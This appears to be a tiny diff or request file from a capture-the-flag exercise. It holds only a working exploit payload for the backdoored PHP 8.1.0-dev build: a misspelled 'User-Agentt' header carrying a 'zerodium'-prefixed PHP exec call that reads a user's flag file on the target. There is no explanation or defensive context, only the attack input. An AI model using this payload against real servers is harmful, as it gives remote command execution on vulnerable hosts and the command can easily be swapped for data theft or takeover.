@@ -1,0 +1,2 @@
+User-Agentt
+zerodiumvar_dump(exec('cat /home/james/user.txt'));die();
